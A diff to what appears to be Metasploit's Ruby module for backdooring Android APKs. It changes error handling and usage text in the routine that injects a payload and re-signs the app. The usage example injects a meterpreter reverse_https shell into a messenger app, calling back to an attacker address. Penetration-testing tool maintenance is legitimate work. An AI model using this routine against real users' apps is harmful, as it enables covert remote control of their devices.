@@ -21,13 +21,13 @@ module Msf::Payload::Apk
     $stderr.puts "[*] #{msg}"
   end
 
-  def print_error(msf='')
+  def print_error(msg='')
     $stderr.puts "[-] #{msg}"
   end
 
   def usage
-    print_error "Usage: #{$0} [target.apk] [msfvenom options]\n"
-    print_error "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
+    print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n"
+    print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
   end
 
   def run_cmd(cmd)
@@ -120,25 +120,22 @@ module Msf::Payload::Apk
   def backdoor_payload(apkfile, raw_payload)
     unless apkfile && File.readable?(apkfile)
       usage
-      exit(1)
+      raise RuntimeError, "Invalid template: #{apkfile}"
     end
 
     jarsigner = run_cmd("jarsigner")
     unless jarsigner != nil
-      print_error("jarsigner not found. If it's not in your PATH, please add it.")
-      exit(1)
+      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
     end
 
     apktool = run_cmd("apktool -version")
     unless apktool != nil
-      print_error "apktool not found. If it's not in your PATH, please add it."
-      exit(1)
+      raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
     end
 
     apk_v = Gem::Version.new(apktool)
     unless apk_v >= Gem::Version.new('2.0.1')
-      print_error "apktool version #{apk_v} not supported, please download at least version 2.0.1."
-      exit(1)
+      raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
     end
 
     #Create temporary directory where work will be done
@@ -163,8 +160,7 @@ module Msf::Payload::Apk
     begin
       activitysmali = File.read(smalifile)
     rescue Errno::ENOENT
-      print_status "Unable to find correct hook automatically\n"
-      exit
+      raise RuntimeError, "Unable to find hook point in #{apkfile}\n"
     end
 
     print_status "Copying payload files..\n"
@@ -185,8 +181,9 @@ module Msf::Payload::Apk
     run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")
 
     outputapk = File.read(injected_apk)
-  rescue
+
     FileUtils.remove_entry tempdir
+    outputapk
   end
 end
 
